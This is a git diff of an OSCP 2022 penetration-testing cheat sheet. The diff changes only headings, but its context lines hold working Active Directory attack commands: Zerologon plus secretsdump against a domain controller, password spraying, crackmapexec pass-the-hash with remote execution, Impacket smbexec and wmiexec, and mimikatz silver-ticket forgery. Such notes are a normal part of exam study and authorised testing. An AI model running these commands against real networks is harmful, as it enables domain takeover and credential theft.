@@ -208,6 +208,8 @@ Useful Powershell one-liners:
 Useful lateral movement techniques:
 * https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
 
+### ZeroLogon Vulnerability
+
 Try Zerologon (requires reset after use as account pw is set to empty)
 * Source: https://github.com/risksense/zerologon
 * Affects ALL Windows Server versions, but we want to target DCs (high-value).
@@ -221,7 +223,7 @@ $ python secretsdump.py -hashes :[empty_password_hash] '[domain]/[dc_computernam
 $ python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'xor/xor-dc01$@x.x.x.x'
 ```
 
-Password spraying
+### Password spraying
 * Dumped plaintext cred or cracked hash for your user?
 * However, no creds/hashes for other users/SPN to use for lateral movement?
 * Does the plaintext cred follow some pattern? e.g. `IAmUser01, IAmUser02 ...`
@@ -233,7 +235,7 @@ PS> .\spray-passwords.ps1 -Admin -Pass IamUser02
 ...
 ```
 
-Have plaintext credentials?
+### Plaintext Credentials
 ```bash
 # RDP clients
 $ rdesktop [target]
@@ -250,7 +252,7 @@ cmd> winrs -u:[username] -p:[password] -r:http://[target]:5985/wsman "cmd" # exe
 # See https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#user-account-control-uac-bypass
 ```
 
-Pass-the-Hash
+### Pass-the-Hash
 * Requires user/service account to have local admin rights on target, as connection is made using the `Admin$` share.
 * Requires SMB connection through the firewall
 * Requires Windows File and Print Sharing feature to be enabled.
@@ -276,7 +278,7 @@ $ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\Curr
 $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
 ```
 
-Overpass-the-Hash
+### Overpass-the-Hash
 * Attack path: obtain a user's NTLM hash -> request Kerberos TGT -> access any machine where the user has permissions.
 * Requirement: user/service account to have local admin on target machine.
 * Useful when Kerberos is the only authentication mechanism allowed in a target.
@@ -317,7 +319,7 @@ $ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 $ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
-Pass-the-Ticket / Silver Ticket
+### Pass-the-Ticket / Silver Ticket
 * In this attack, user/group permissions in a Service Ticket are blindly trusted by the application on a target server running in the context of the service account. We forge our own Service Ticket (Silver Ticket) to access the resource (e.g. IIS app, MSSQL app) with any permissions we want. If the SPN/service account is used across multiple servers, we can leverage our Silver Ticket against all.
 * By
 * Walkthrough of PTT via. compromised MSSQLSvc hash: https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/
@@ -331,7 +333,7 @@ mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_va
         /target:[service_hostname] /service:[service_type] /rc4:[hash] /ptt
 ```
 
-Distributed Component Object Model (DCOM)
+### Distributed Component Object Model (DCOM)
 * DCOM allows a computer to run programs over the network on a different computer e.g. Excel/PowerPoint/Outlook
 * Requires RPC port 135 and local admin access to call the DCOM Service Control Manager - the API.
 * The `run` method within DCOM allows us to execute a VBA macro remotely.
